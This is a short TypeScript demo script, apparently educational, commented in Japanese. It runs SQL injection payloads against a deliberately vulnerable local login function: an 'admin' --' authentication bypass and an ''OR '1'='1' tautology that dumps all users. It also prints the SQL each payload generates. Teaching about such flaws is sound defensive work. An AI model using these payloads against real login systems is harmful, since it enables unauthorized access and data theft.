import { login } from "../src/vulnerabilities/sql-injection/vulnerable";

// npx tsx scripts/demo-sqli.ts

// DBをセットアップ
import "../src/db/seed";

console.log("\n=== SQL Injection デモ ===\n");

// 正常なログイン
console.log("正常なログイン");
console.log("   username: alice");
console.log("   password: password123");
const normal = login("alice", "password123");
console.log("   結果:", normal.length > 0 ? "ログイン成功" : "ログイン失敗");
console.log("   データ:", normal);

console.log("\n" + "-".repeat(50) + "\n");

// 間違ったパスワード
console.log("間違ったパスワード");
console.log("   username: alice");
console.log("   password: wrongpassword");
const wrong = login("alice", "wrongpassword");
console.log("   結果:", wrong.length > 0 ? "ログイン成功" : "ログイン失敗（期待通り）");

console.log("\n" + "-".repeat(50) + "\n");

// SQL Injection 攻撃
console.log("SQL Injection 攻撃");
console.log("   username: admin' --");
console.log("   password: anything");
console.log("\n   生成されるSQL:");
console.log("   SELECT * FROM users");
console.log("   WHERE username = 'admin' --' AND password = 'anything'");

const attack = login("admin' -- ", "anything");
console.log("   結果:", attack.length > 0 ? "攻撃成功！認証バイパス！" : "攻撃失敗");
console.log("   データ:", attack);

console.log("\n" + "-".repeat(50) + "\n");

// OR攻撃（全ユーザー取得）
console.log("OR攻撃（全ユーザー取得）");
console.log("   username: ' OR '1'='1");
console.log("   password: ' OR '1'='1");
console.log("\n   生成されるSQL:");
console.log("   SELECT * FROM users");
console.log("   WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'");
console.log("                        ↑");
console.log("          常に真になる条件\n");

const orAttack = login("' OR '1'='1", "' OR '1'='1");
console.log("   結果:", orAttack.length > 0 ? `攻撃成功！${orAttack.length}件取得！` : "攻撃失敗");
console.log("   データ:", orAttack);

console.log("\n=== デモ終了 ===\n");
